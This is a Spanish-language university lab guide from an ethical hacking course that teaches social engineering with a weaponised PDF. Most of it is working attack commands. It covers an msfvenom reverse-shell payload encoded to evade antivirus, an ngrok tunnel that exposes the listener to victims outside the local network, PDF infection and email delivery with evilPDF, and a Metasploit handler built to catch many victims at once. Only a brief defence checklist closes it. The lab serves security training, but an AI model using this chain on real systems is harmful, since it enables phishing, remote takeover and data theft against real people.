
# Laboratorio Semana 10 – Ingeniería Social y Esteganografía en PDF - (CY-203 Hackeo Ético)

**Duración estimada:** 1.5 horas  
**Modalidad:** Práctica guiada con máquinas virtuales (Kali Linux y Windows)  
**Objetivo:** Aplicar técnicas de esteganografía y ataque de ingeniería social mediante la creación de documentos PDF con cargas maliciosas embebidas y configuración de listener multiusuario.

---

## Introducción a la Ingeniería Social y Metasploit

Durante este laboratorio simularás un ataque mediante ingeniería social usando un documento PDF aparentemente legítimo que contiene una carga maliciosa. Esta técnica permite obtener acceso remoto a la máquina de una víctima que lo ejecute, aún si no está en la misma red.  

Este tipo de ataque es usado por actores maliciosos que buscan explotar la **confianza del usuario final** y puede ser defendido con entrenamiento, segmentación de red y monitoreo avanzado.

---

## Conceptos básicos en Metasploit

- **RHOSTS:** IP o dominio de la víctima (Remote Host)
- **RPORT:** Puerto remoto al que se conecta el exploit
- **LHOST:** IP del atacante (Local Host)
- **LPORT:** Puerto local para recibir la conexión reversa
- **PAYLOAD:** Código que se ejecutará en la máquina víctima (ej: shell o Meterpreter)
- **Exploit:** Módulo que aprovecha una vulnerabilidad
- **Session:** Conexión activa obtenida tras explotar la víctima
- **ENCODER:** Técnica para ofuscar el payload y evitar antivirus
- **ARCH:** Arquitectura objetivo (x86 para 32 bits, x64 para 64 bits)

---

##  Parte 1: Preparación del entorno

### 1.1 Requisitos
- Kali Linux como atacante
- Máquina virtual Windows 10 como víctima
- Red configurada con NAT o puente (bridge)

---

## Parte 1.5: Exposición a Internet con Ngrok (víctimas fuera de LAN)

Si la víctima no está en tu misma red (por ejemplo, si recibe el PDF por correo), puedes usar **ngrok** para exponer tu listener de Kali Linux a Internet:

### 1.5.1 Prerrequisitos

Debes tener una cuenta gratuita en [https://ngrok.com](https://ngrok.com), haber iniciado sesión en Kali, y tener tu **token autenticado** con:

```bash
ngrok config add-authtoken TU_TOKEN
```

>  Ngrok requiere una **tarjeta registrada** para exponer servicios en puertos TCP como el 4444. La tarjeta no será cobrada, pero es obligatoria para mitigar abuso.

### 1.5.2 Crear túnel TCP con ngrok

```bash
ngrok tcp 4444
```

Verás una salida similar a:

```
Forwarding tcp://4.tcp.ngrok.io:16205 -> localhost:4444
```

Toma nota de:

- `LHOST = 4.tcp.ngrok.io`
- `LPORT = 16205`

---

## Parte 1.6: Generar payload `shell.exe` con los valores de Ngrok

Antes de infectar el PDF, debes generar un ejecutable con el payload adaptado al túnel de Ngrok:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=4.tcp.ngrok.io LPORT=16205 -f exe -e x64/xor_dynamic -i 5 -o shell.exe
```

Este archivo debe colocarse en el mismo directorio del proyecto `evilPDF`, junto a `main.py`.

---

## Parte 2: Generación del PDF infectado con `evilPDF`

### 2.1 Clonar y preparar `evilPDF`

download https://github.com/eamatamorales/HackeoEtico-IngSocial/tree/main/evilPDF
```bash
cd evilPDF
mkdir futures dones evils
chmod +x script/convert.sh
```

### 2.2 Ejecutar main.py

```bash
python3 main.py
```

Durante la configuración inicial escribe el correo, contraseña de envío, y permite que detecte tu IP.

### 2.3 Cargar archivos

```bash
setpdf documento_base.pdf
infect
```

Esto generará un PDF malicioso embebido en la carpeta `evils/`. Puedes verificarlo con:

```bash
showpdf
```

Este archivo puede ser distribuido por correo electrónico usando:

```bash
setmail victima@example.com
sendmail
```

---

## Parte 3: Configuración del listener multiusuario con Metasploit

### 3.1 Escuchar múltiples víctimas

Abre `msfconsole` y configura el listener con los valores reales de ngrok:

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
```

Esto permite que múltiples víctimas se conecten desde Internet al túnel expuesto por ngrok.

---

## Parte 4: Simulación y conexión remota

Cuando la víctima ejecute el archivo embebido desde el PDF, se abrirá una sesión en Metasploit:

```bash
sessions
sessions -i <id>
getuid
sysinfo
```

---

## Parte 5: Consideraciones de múltiples víctimas

Si más de una persona abre el PDF, cada una iniciará su propia sesión:

```bash
sessions -l
```

Podrás interactuar con cada una de forma independiente:

```bash
sessions -i 1
sessions -i 2
```

Esto simula una campaña masiva de ingeniería social.

---

## Parte 6: Defensa y concientización

Recomendaciones:
- Nunca abrir archivos PDF de origen desconocido
- Configurar antivirus que detecte comportamiento sospechoso
- Bloquear conexiones salientes no autorizadas en el firewall
- Usar sandbox para visualizar archivos externos

---

## Entregables

- Captura del listener (Metasploit) con múltiples sesiones activas
- Captura de ejecución de `getuid` o `sysinfo`
- Evidencia de generación del PDF con `evilPDF`
- Reflexión: ¿qué vulnerabilidades humanas son explotadas en este ataque?

---

## Recursos

- [https://github.com/emilJ0/evilPDF](https://github.com/emilJ0/evilPDF)
- [https://ngrok.com/](https://ngrok.com/)
- [https://docs.rapid7.com/metasploit/](https://docs.rapid7.com/metasploit/)

- ---

**Profesor:** Esteban Mata Morales  
**Curso:** CY-203 Hackeo Ético  
**Universidad Fidélitas de Costa Rica**
